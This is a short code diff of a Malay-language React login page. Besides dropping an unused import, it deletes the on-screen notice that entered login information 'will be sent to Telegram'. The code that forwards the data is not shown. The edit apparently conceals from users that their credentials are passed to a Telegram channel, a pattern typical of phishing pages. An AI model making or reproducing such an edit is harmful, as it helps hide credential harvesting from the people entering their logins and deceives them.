@@ -1,6 +1,6 @@
 import React, { useState } from "react";
 import { Button } from "@/components/ui/button";
-import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
+import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { showError, showSuccess } from "@/utils/toast";
@@ -39,9 +39,6 @@ const LoginPage: React.FC = () => {
     <Card className="w-full max-w-sm text-left shadow-lg animate-fade-in-up">
       <CardHeader>
         <CardTitle className="text-2xl font-bold text-foreground">Log Masuk</CardTitle>
-        <CardDescription className="text-foreground/80">
-          Maklumat yang anda masukkan akan dihantar ke Telegram.
-        </CardDescription>
       </CardHeader>
       <CardContent>
         <form onSubmit={handleSubmit} className="space-y-4">
